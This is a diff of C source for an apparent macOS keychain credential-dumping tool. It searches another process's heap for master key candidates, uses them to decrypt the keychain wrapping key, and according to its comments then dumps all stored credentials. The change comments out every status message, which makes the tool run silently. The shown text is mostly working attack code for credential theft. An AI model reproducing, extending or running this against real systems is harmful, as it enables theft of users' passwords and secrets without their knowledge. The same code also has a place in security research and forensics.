@@ -149,7 +149,7 @@ void search_for_keys_in_process(int pid) {
     vm_address_t start, stop;
     while (fgets(line, 512, p)) {
         if(sscanf(line, "MALLOC_TINY %lx-%lx", &start, &stop) == 2) {
-            printf("[*] Searching process %i heap range 0x%lx-0x%lx\n", pid, start, stop);
+//            printf("[*] Searching process %i heap range 0x%lx-0x%lx\n", pid, start, stop);
             search_for_keys_in_task_memory(task, start, stop);
         }
     }
@@ -484,7 +484,7 @@ int getcreds(int argc, char **argv) {
     
     search_for_keys_in_process(pid);
     
-    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
+//    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
     
     if (!g_master_candidates_count) exit(1);
     
@@ -510,16 +510,16 @@ int getcreds(int argc, char **argv) {
     fread(buffer, 1, sz, f);
     fclose(f);
     
-    printf("[*] Trying to decrypt wrapping key in %s\n", filename);
+//    printf("[*] Trying to decrypt wrapping key in %s\n", filename);
     
     char key[24];
     int i, key_len = 0;
     for (i = 0; i < g_master_candidates_count; ++i) {
         char s_key[24*2+1];
         hex_string(s_key, g_master_candidates[i], 24);
-        printf("[*] Trying master key candidate: %s\n", s_key);
+//        printf("[*] Trying master key candidate: %s\n", s_key);
         if ((key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz))) {
-            printf("[+] Found master key: %s\n", s_key);
+//            printf("[+] Found master key: %s\n", s_key);
             break;
         }
     }
@@ -530,7 +530,7 @@ int getcreds(int argc, char **argv) {
     
     char s_key[24*2+1];
     hex_string(s_key, key, 24);
-    printf("[+] Found wrapping key: %s\n", s_key);
+//    printf("[+] Found wrapping key: %s\n", s_key);
     
     // Phase 3. Using the wrapping key, dump all credentials from the keychain
     // file into the global credentials list and decrypt everything.
